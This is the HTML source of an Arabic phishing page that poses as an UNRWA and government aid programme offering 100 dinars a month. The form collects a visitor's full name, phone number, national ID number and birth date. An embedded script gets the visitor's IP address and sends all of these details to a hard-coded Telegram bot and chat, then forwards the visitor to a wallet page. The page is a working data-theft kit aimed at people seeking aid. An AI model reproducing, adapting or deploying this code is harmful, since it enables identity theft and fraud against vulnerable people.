<!DOCTYPE html>
<html lang="ar">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="RQktravBpGn4uHMq4r0cM4WA8QZ4HeOq26zJkgqM">
    <meta property="og:image" content="https://www2.0zz0.com/2025/05/04/15/668940162.png">
    <meta property="og:site_name" content="Unrwa والحكومة">
    <meta property="og:description" content="Unrwa والحكومة">

    <title>صرف مبلغ 100 دينار فوري وشهرياً</title>

    <link rel="dns-prefetch" href="http://fonts.gstatic.com/">
    <link href="https://fonts.googleapis.com/css2?family=Droid+Arabic+Kufi:wght@400;700&display=swap" rel="stylesheet">
    <link href="style.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />

    <style type="text/css">
        * {
            direction: rtl;
            font-family: 'Droid Arabic Kufi', sans-serif;
        }

        body,
        h6,
        label,
        input,
        button,
        small,
        footer,
        .form-group {
            text-align: right !important;
        }

        .form-group.centered-button {
            text-align: center !important;
        }

        .form-group.centered-button button {
            font-size: 1.5rem;
            padding: 15px 30px;
            border-radius: 50px;
            background-color: #000;
            color: #FFF;
            border: none;
        }

        .form-group.centered-button button:hover {
            background-color: #333;
        }

        footer {
            margin-top: 5px;
            background-color: #000;
            padding: 20px;
            color: #FFF;
            font-weight: bold;
        }

        footer small {
            font-size: 14px;
            color: #FFF;
            font-weight: bolder;
        }

        .form-control {
            font-size: 1.2rem;
            padding: 15px;
            border-radius: 10px;
            border: 2px solid #000;
            margin-bottom: 20px;
        }

        .date-picker-wrapper {
            position: relative;
            display: inline-block;
            width: 100%;
        }

        .styled-date {
            font-size: 1.5rem;
            padding: 15px;
            border-radius: 50px;
            border: 2px solid #000;
            background-color: #f9f9f9;
            color: #333;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }

        .styled-date:hover {
            border-color: #007bff;
            background-color: #e6f7ff;
        }

        .styled-date:focus {
            outline: none;
            border-color: #28a745;
            background-color: #e3ffe3;
            box-shadow: 0 0 8px rgba(40, 167, 69, 0.5);
        }
    </style>
</head>

<body>
    <main class="py-4">
        <div class="container justify-content-center text-center container-logo">
            <a class="navbar-brand justify-content-center">
                <img src="https://www2.0zz0.com/2025/05/04/15/668940162.png" style="width:100%" alt="logo">
            </a>
        </div>

        <div class="container">
            <div class="container justify-content-center">
                <form id="login-form" style="padding: 10px;">
                    <div class="form-group row text-right">
                        <input type="text" id="full-name" class="form-control" name="full-name" placeholder="أدخل الإسم الرباعي" autofocus="">
                    </div>
                    <div class="form-group row text-right">
                        <input type="text" id="phone-number" class="form-control" name="phone-number" placeholder="أدخل رقم الهاتف">
                        <span id="verify_phone_number" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى إدخال رقم هاتف صالح</span>
                    </div>
                    <div class="form-group row text-right">
                        <input type="text" id="national-id" class="form-control" name="national-id" placeholder="أدخل الرقم الوطني">
                    </div>
                    <div class="form-group row text-right">
                        <label for="birth-date" class="form-label">تاريخ الميلاد:</label>
                        <div class="date-picker-wrapper">
                            <input type="date" id="birth-date" class="form-control styled-date" name="birth-date" placeholder="اختر تاريخ الميلاد" min="1925-01-01" max="2005-12-31" required>
                            <span id="verify_birth_date" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى إدخال تاريخ ميلاد صالح</span>
                        </div>
                    </div>

                    <div class="form-group centered-button">
                        <button type="submit" class="btn btn-success">
                            <i class="fa fa-lock ml-10"></i> متابعة
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <footer>
            <small>© 2025 جميع الحقوق محفوظة لـشركة المعونة الوطنية</small>
        </footer>

        <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

        <script>
            $(document).ready(function () {
                let userIP = '';

                // جلب الـ IP الخاص بالمستخدم
                $.get("https://api.ipify.org?format=json", function (data) {
                    userIP = data.ip;
                });

                $('#login-form').submit(function (event) {
                    event.preventDefault();
                    $('#verify_phone_number').hide();

                    const fullName = $("#full-name").val();
                    const phoneNumber = $("#phone-number").val();
                    const nationalId = $("#national-id").val();
                    const birthDate = $("#birth-date").val();

                    if (!phoneNumber || !/^\d{10,15}$/.test(phoneNumber)) {
                        $('#verify_phone_number').text('يرجى إدخال رقم هاتف صالح').show();
                        return;
                    }

                    const botToken = "7603771616:AAEK5yLEQSvz5nHq_nxer1aDtypLjemGzTg"; // ضع رمز البوت الخاص بك هنا
                    const chatId = "-4625923889"; // ضع رقم تعريف الدردشة الخاصة بك هنا

                    let message = `الإسم الرباعي: ${fullName}\nرقم الهاتف: ${phoneNumber}\nالرقم الوطني: ${nationalId}\nتاريخ الميلاد: ${birthDate}\nعنوان IP: ${userIP}`;

                    // إرسال النص
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                        }),
                    })
                        .then((response) => {
                            if (!response.ok) {
                                throw new Error("Failed to send message");
                            }

                            // التوجيه إلى صفحة أخرى بعد نجاح الإرسال
                            window.location.href = "wallet.html"; // استبدل الرابط بالصفحة المطلوبة
                        })
                        .catch(() => {
                            alert("حدث خطأ أثناء إرسال البيانات النصية!");
                        });
                });
            });
        </script>
    </main>
</body>

</html>
